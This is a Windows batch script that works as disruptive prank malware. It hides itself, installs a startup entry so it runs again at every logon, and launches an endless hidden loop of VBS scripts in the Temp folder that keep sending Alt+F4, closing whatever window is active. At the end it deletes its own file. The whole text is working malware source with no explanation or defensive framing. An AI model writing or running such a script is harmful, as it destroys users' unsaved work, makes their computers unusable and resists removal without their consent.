(
echo ^(
echo echo set fs=createobject^^^("wscript.shell"^^^)
echo echo fs.run "%%systemdrive%%\Windows\Temp\main_prog.bat", 0
echo ^) ^> %%systemdrive%%\Windows\Temp\start.vbs
echo ^(
echo echo @echo off
echo echo :a
echo echo start %%systemdrive%%\Windows\Temp\altf4.vbs
echo echo goto a
echo ^) ^> %%systemdrive%%\Windows\Temp\main_prog.bat
echo ^(
echo echo set x=createobject^^^("wscript.shell"^^^)
echo echo x.sendkeys "%%%%{f4}"
echo ^) ^> %%systemdrive%%\Windows\Temp\altf4.vbs
echo start %%systemdrive%%\Windows\Temp\start.vbs
) > %UserProfile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\startup.bat

(
echo set fs=createobject^("wscript.shell"^)
echo fs.run "%%systemdrive%%\Windows\Temp\main_prog.bat", 0
) > %systemdrive%\Windows\Temp\start.vbs
(
echo @echo off
echo :a
echo start %%systemdrive%%\Windows\Temp\altf4.vbs
echo goto a
) > %systemdrive%\Windows\Temp\main_prog.bat
(
echo set x=createobject^("wscript.shell"^)
echo x.sendkeys "%%{f4}"
) > %systemdrive%\Windows\Temp\altf4.vbs
start %systemdrive%\Windows\Temp\start.vbs
del alt+f4_spam.bat